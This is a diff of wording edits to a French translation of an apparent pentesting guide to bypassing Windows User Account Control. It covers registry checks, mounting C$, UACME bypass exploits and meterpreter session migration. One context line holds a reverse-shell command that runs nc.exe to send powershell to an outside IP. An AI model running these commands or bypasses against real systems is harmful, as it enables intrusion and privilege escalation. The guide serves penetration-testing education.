@@ -21,7 +21,7 @@ Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protecti
 | [Contrôle de Compte Utilisateur : Mode d'Approbation Admin pour le compte Administrateur intégré](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Désactivé                                                   |
 | [Contrôle de Compte Utilisateur : Autoriser les applications UIAccess à demander une élévation sans utiliser le bureau sécurisé](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Désactivé                                                   |
 | [Contrôle de Compte Utilisateur : Comportement de l'invite d'élévation pour les administrateurs en Mode d'Approbation Admin](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Demander le consentement pour les binaires non-Windows      |
-| [Contrôle de Compte Utilisateur : Comportement de l'invite d'élévation pour les utilisateurs standards](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Demander des informations d'identification sur le bureau sécurisé |
+| [Contrôle de Compte Utilisateur : Comportement de l'invite d'élévation pour les utilisateurs standard](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Demander des informations d'identification sur le bureau sécurisé |
 | [Contrôle de Compte Utilisateur : Détecter les installations d'applications et demander une élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Activé (par défaut pour les foyers) Désactivé (par défaut pour les entreprises) |
 | [Contrôle de Compte Utilisateur : Élever uniquement les exécutables qui sont signés et validés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Désactivé                                                   |
 | [Contrôle de Compte Utilisateur : Élever uniquement les applications UIAccess qui sont installées dans des emplacements sécurisés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Activé                                                      |
@@ -52,7 +52,7 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 EnableLUA    REG_DWORD    0x1
 ```
-Si c'est **`1`**, alors UAC est **activé**, si c'est **`0`** ou s'il **n'existe pas**, alors UAC est **inactif**.
+Si c'est **`1`**, alors UAC est **activé**, si c'est **`0`** ou qu'il **n'existe pas**, alors UAC est **inactif**.
 
 Ensuite, vérifiez **quel niveau** est configuré :
 ```
@@ -62,11 +62,11 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
 - Si **`0`**, alors, UAC ne demandera pas (comme **désactivé**)
-- Si **`1`**, l'administrateur est **demandé pour le nom d'utilisateur et le mot de passe** pour exécuter le binaire avec des droits élevés (sur le Bureau Sécurisé)
-- Si **`2`** (**Toujours me notifier**) UAC demandera toujours confirmation à l'administrateur lorsqu'il essaie d'exécuter quelque chose avec des privilèges élevés (sur le Bureau Sécurisé)
+- Si **`1`**, l'admin est **demandé pour le nom d'utilisateur et le mot de passe** pour exécuter le binaire avec des droits élevés (sur le Bureau Sécurisé)
+- Si **`2`** (**Toujours me notifier**) UAC demandera toujours une confirmation à l'administrateur lorsqu'il essaie d'exécuter quelque chose avec des privilèges élevés (sur le Bureau Sécurisé)
 - Si **`3`**, comme `1` mais pas nécessaire sur le Bureau Sécurisé
 - Si **`4`**, comme `2` mais pas nécessaire sur le Bureau Sécurisé
-- si **`5`**(**par défaut**) il demandera à l'administrateur de confirmer l'exécution de binaires non Windows avec des privilèges élevés
+- si **`5`**(**par défaut**), il demandera à l'administrateur de confirmer pour exécuter des binaires non Windows avec des privilèges élevés
 
 Ensuite, vous devez examiner la valeur de **`LocalAccountTokenFilterPolicy`**\
 Si la valeur est **`0`**, alors, seul l'utilisateur **RID 500** (**Administrateur intégré**) est capable d'effectuer des **tâches administratives sans UAC**, et si c'est `1`, **tous les comptes dans le groupe "Administrateurs"** peuvent le faire.
@@ -112,7 +112,7 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 
 ### **Très** Basique "contournement" UAC (accès complet au système de fichiers)
 
-Si vous avez un shell avec un utilisateur qui fait partie du groupe Administrateurs, vous pouvez **monter le C$** partagé via SMB (système de fichiers) localement sur un nouveau disque et vous aurez **accès à tout à l'intérieur du système de fichiers** (même le dossier personnel de l'Administrateur).
+Si vous avez un shell avec un utilisateur qui fait partie du groupe Administrateurs, vous pouvez **monter le C$** partagé via SMB (système de fichiers) local dans un nouveau disque et vous aurez **accès à tout dans le système de fichiers** (même le dossier personnel de l'Administrateur).
 
 > [!WARNING]
 > **On dirait que ce truc ne fonctionne plus**
@@ -145,7 +145,7 @@ Documentation et outil dans [https://github.com/wh0amitz/KRBUACBypass](https://g
 
 ### Exploits de contournement UAC
 
-[**UACME** ](https://github.com/hfiref0x/UACME) qui est une **compilation** de plusieurs exploits de contournement UAC. Notez que vous devrez **compiler UACME en utilisant visual studio ou msbuild**. La compilation créera plusieurs exécutables (comme `Source\Akagi\outout\x64\Debug\Akagi.exe`), vous devrez savoir **lequel vous avez besoin.**\
+[**UACME** ](https://github.com/hfiref0x/UACME)qui est une **compilation** de plusieurs exploits de contournement UAC. Notez que vous devrez **compiler UACME en utilisant visual studio ou msbuild**. La compilation créera plusieurs exécutables (comme `Source\Akagi\outout\x64\Debug\Akagi.exe`), vous devrez savoir **lequel vous avez besoin.**\
 Vous devez **être prudent** car certains contournements **demanderont à d'autres programmes** qui **alerteront** l'**utilisateur** que quelque chose se passe.
 
 UACME a la **version de construction à partir de laquelle chaque technique a commencé à fonctionner**. Vous pouvez rechercher une technique affectant vos versions :
@@ -158,9 +158,9 @@ Major  Minor  Build  Revision
 ```
 Aussi, en utilisant [cette](https://en.wikipedia.org/wiki/Windows_10_version_history) page, vous obtenez la version de Windows `1607` à partir des versions de build.
 
-#### Plus de contournements UAC
+#### Plus de contournement UAC
 
-**Toutes** les techniques utilisées ici pour contourner l'AUC **nécessitent** un **shell interactif complet** avec la victime (un shell nc.exe classique ne suffit pas).
+**Toutes** les techniques utilisées ici pour contourner l'AUC **nécessitent** un **shell interactif complet** avec la victime (un shell nc.exe commun n'est pas suffisant).
 
 Vous pouvez obtenir cela en utilisant une session **meterpreter**. Migrez vers un **processus** qui a la valeur **Session** égale à **1** :
 
